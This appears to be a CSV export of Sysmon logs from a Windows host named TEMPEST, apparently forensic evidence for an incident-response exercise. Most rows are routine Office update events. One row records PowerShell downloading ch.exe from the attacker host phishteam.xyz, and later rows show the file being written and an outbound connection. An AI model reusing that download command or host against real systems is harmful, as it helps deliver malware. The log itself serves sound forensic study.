419,7924,2022-06-20 17:17:32.3532529,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,6,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: DLL,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\msvcr120.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.340""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\msvcr120.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.340""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
420,7925,2022-06-20 17:17:32.3630448,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,6,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: EXE,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\OfficeC2RClient.exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.355""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\OfficeC2RClient.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.355""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
421,7926,2022-06-20 17:17:32.5255799,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: DLL,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\OfficeC2RCom.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.511""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\OfficeC2RCom.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.511""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
422,7927,2022-06-20 17:17:32.5432957,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: EXE,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\OfficeClickToRun.exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.542""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\OfficeClickToRun.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.528""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
423,7928,2022-06-20 17:17:32.6366087,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: DLL,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\officeinventory.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.621""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\officeinventory.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.621""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
424,7929,2022-06-20 17:17:32.6425109,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: EXE,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\officesvcmgr.exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""EXE""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.636""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\officesvcmgr.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.636""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
425,7930,2022-06-20 17:17:32.6755954,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: DLL,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\offreg.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.667""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\offreg.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.667""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
426,7931,2022-06-20 17:17:32.6768686,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: DLL,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\policy.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.667""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\policy.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.667""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
427,7932,2022-06-20 17:17:32.6894077,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: DLL,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\RepoMan.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.683""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\RepoMan.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.683""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
428,7933,2022-06-20 17:17:32.7286148,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: DLL,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\StreamServer.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.715""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\StreamServer.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.715""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
429,7934,2022-06-20 17:17:32.7605028,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: DLL,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\ucrtbase.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.745""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\ucrtbase.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.745""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
430,7935,2022-06-20 17:17:32.7694864,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: DLL,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\vccorlib140.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.762""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\vccorlib140.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.762""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
431,7936,2022-06-20 17:17:32.7736365,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: DLL,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\vcruntime140.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.762""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\vcruntime140.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.762""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
432,7937,2022-06-20 17:17:32.7750302,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,NT AUTHORITY\SYSTEM,,"ProcessID: 7560, ProcessGUID: 4bbef3ae-a8ec-62b0-5e08-000000000700",RuleName: DLL,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe,TargetFilename: C:\Program Files\Common Files\microsoft shared\ClickToRun\Updates\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\vcruntime140_1.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:32.762""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-a8ec-62b0-5e08-000000000700""},{""@Name"":""ProcessId"",""#text"":""7560""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeClickToRun.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\Updates\\16.0.15225.20288OfficeC2RC442FD92-468A-45F1-9CE2-0589ACC4DE4E\\vcruntime140_1.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:32.762""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
433,7938,2022-06-20 17:17:33.7635895,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,7,S-1-5-18,DNSEvent (DNS query),NT AUTHORITY\SYSTEM,,"ProcessID: 1316, ProcessGUID: 4bbef3ae-abac-62b0-a90a-000000000700",RuleName: -,Image: C:\Program Files\Common Files\Microsoft Shared\ClickToRun\Updates\16.0.15225.20288\OfficeClickToRun.exe,QueryName: ecs.office.com,QueryStatus: 0,QueryResults: 2620:1ec:42::132;::ffff:52.113.194.132;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:03:31.719""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abac-62b0-a90a-000000000700""},{""@Name"":""ProcessId"",""#text"":""1316""},{""@Name"":""QueryName"",""#text"":""ecs.office.com""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""2620:1ec:42::132;::ffff:52.113.194.132;""},{""@Name"":""Image"",""#text"":""C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\16.0.15225.20288\\OfficeClickToRun.exe""},{""@Name"":""User"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
434,7939,2022-06-20 17:17:36.4476656,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 7428, ProcessGUID: 4bbef3ae-abb0-62b0-aa0a-000000000700",RuleName: -,"MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",ParentProcess: -,"ParentProcessID: 8948, ParentProcessGUID: 00000000-0000-0000-0000-000000000000",ParentCommandLine: -,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:36.444""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abb0-62b0-aa0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""7428""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows PowerShell""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""PowerShell.EXE""},{""@Name"":""CommandLine"",""#text"":""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\\Users\\benimaru\\Downloads\\ch.exe""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-ab09-62b0-1ca9-b00100000000""},{""@Name"":""LogonId"",""#text"":""0x1B0A91C""},{""@Name"":""TerminalSessionId"",""#text"":""11""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F""},{""@Name"":""ParentProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ParentProcessId"",""#text"":""8948""},{""@Name"":""ParentImage"",""#text"":""-""},{""@Name"":""ParentCommandLine"",""#text"":""-""},{""@Name"":""ParentUser"",""#text"":""-""}]}}"
435,7940,2022-06-20 17:17:36.5864531,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 7428, ProcessGUID: 4bbef3ae-abb0-62b0-aa0a-000000000700",RuleName: -,Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\__PSScriptPolicyTest_hwf1wris.tjx.ps1,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:36.558""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abb0-62b0-aa0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""7428""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\__PSScriptPolicyTest_hwf1wris.tjx.ps1""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:36.558""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
436,7941,2022-06-20 17:17:36.9217548,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,7,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 7428, ProcessGUID: 4bbef3ae-abb0-62b0-aa0a-000000000700",RuleName: Downloads,Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,TargetFilename: C:\Users\benimaru\Downloads\ch.exe,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Downloads""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:17:36.917""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abb0-62b0-aa0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""7428""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\Downloads\\ch.exe""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:17:36.917""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
437,7942,2022-06-20 17:17:38.5762170,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,7,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 7428, ProcessGUID: 4bbef3ae-abb0-62b0-aa0a-000000000700",RuleName: -,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.199.191,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:03:35.465""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-abb0-62b0-aa0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""7428""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51957""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.199.191""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
